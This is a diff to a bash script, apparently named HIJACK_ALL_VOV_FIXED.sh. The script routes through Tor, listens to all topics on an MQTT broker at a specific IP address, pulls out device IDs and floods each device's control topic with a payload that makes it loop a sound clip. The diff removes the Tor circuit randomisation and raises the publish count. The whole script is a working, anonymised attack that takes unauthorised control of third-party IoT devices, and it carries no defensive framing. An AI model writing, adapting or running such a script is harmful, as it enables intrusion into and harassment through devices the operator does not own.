@@ -1,5 +1,5 @@
 #!/bin/bash
-# HIJACK_ALL_VOV_FIXED.sh - Peppe Brescia Poeta LOOP
+# HIJACK_ALL_VOV_FIXED.sh - Peppe Brescia Poeta LOOP (NO -C)
 
 PEPPER_URL="https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"
 PEPPER_PAYLOAD='[
@@ -16,17 +16,15 @@ PEPPER_PAYLOAD='[
 
 echo "=== PEppe Brescia Poeta VOV HIJACK LIVE START ==="
 echo "URL: $PEPPER_URL"
-echo "LOOP: YES (repeat:1, days:2147483632)"
-echo "Monitor: torsocks mosquitto_sub -t '#' | grep 51886"
+echo "LOOP: YES"
 
 while read -r line; do
   if [[ $line =~ \"n\":\"([0-9]{17}):[sd]:[0-9]+\" ]]; then
     TOPIC="${BASH_REMATCH[1]}:d:16"
     echo "ID=$TOPIC HIJACKED → Peppe Brescia Poeta"
     
-    for i in {1..3}; do
-      CIRCUIT=$((RANDOM%10+1))
-      torsocks -C $CIRCUIT mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPER_PAYLOAD" &
+    for i in {1..5}; do
+      torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPER_PAYLOAD" &
     done
   fi
 done < <(torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null)
